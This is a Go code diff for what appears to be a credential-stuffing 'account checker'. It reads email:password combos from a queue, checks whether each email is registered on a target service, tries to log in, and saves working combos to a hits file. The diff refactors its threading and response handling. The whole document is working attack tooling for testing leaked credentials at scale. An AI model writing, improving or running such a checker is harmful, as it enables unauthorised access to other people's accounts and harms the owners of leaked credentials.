@@ -85,7 +85,7 @@ func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
 	// If no errors occured and the response status code is 200 (success)
 	if resp.StatusCode() == 200 && err == nil {
 		// Write the combo to the hits.txt file
-		go Global.WriteToFile("data/account_checker/hits.txt", &account)
+		go Global.WriteToFile("data/account_checker/hits.txt", account)
 		hitCount++
 	} else {
 		// Set the current error if the error isn't nil
@@ -102,26 +102,25 @@ func HandleValidateResponse(RequestClient *fasthttp.Client, account string) {
 // If it is, then call the HandleValidateResponse() function
 // in a goroutine for logging into the account
 func HandleEmailCheckResponse(RequestClient *fasthttp.Client, account string, resp *fasthttp.Response, err error) {
+	defer fasthttp.ReleaseResponse(resp)
 	totalRequests++
+
 	// If the error is nil and the status code is 200 (success)
 	if err == nil && resp.StatusCode() == 200 {
 		// Check if the response body contains the string
 		// determining whether the email is already registered
-		var body string = string(resp.Body())
-		if Global.Contains(&body, "email address already registered") {
+		var body string = strings.ToLower(string(resp.Body()))
+		if strings.Contains(body, "email address already registered") {
 			// Run the handler function
-			go HandleValidateResponse(RequestClient, account)
-			return
+			HandleValidateResponse(RequestClient, account)
 		}
 	} else
+
 	// Set the current error and increase the error count
 	{
 		Global.CurrentError = fmt.Sprintf(" >> Email Check Error: %d: %v: %s", resp.StatusCode(), err, string(resp.Body()))
 		errorCount++
 	}
-	// Release the response object as it's
-	// no longer being used
-	fasthttp.ReleaseResponse(resp)
 }
 
 // The Start() function is used to start all of
@@ -143,25 +142,20 @@ func Start(threadCount int) {
 		go func() {
 			// Request Client for sending http requests
 			var RequestClient *fasthttp.Client = Global.SetClient()
-			// Infinite loop
-			for {
+
+			for AccountQueue.IsNotEmpty() {
 				// Display the checker info
 				LiveCounter(&programStartTime, threadCount)
 
-				// If the account queue isn't empty
-				if AccountQueue.IsNotEmpty() {
-					// Define Variables
-					var (
-						// Get the combo from the account queue
-						account string = AccountQueue.Grab().(string)
-						// Send the validation request using the request client and email
-						resp, err = Global.AccountValidationRequest(RequestClient, strings.Split(account, ":")[0])
-					)
-					// Handle the above response
-					go HandleEmailCheckResponse(RequestClient, account, resp, err)
-				} else {
-					return
-				}
+				// Define Variables
+				var (
+					// Get the combo from the account queue
+					account string = AccountQueue.Grab().(string)
+					// Send the validation request using the request client and email
+					resp, err = Global.AccountValidationRequest(RequestClient, strings.Split(account, ":")[0])
+				)
+				// Handle the above response
+				HandleEmailCheckResponse(RequestClient, account, resp, err)
 			}
 		}()
 	}
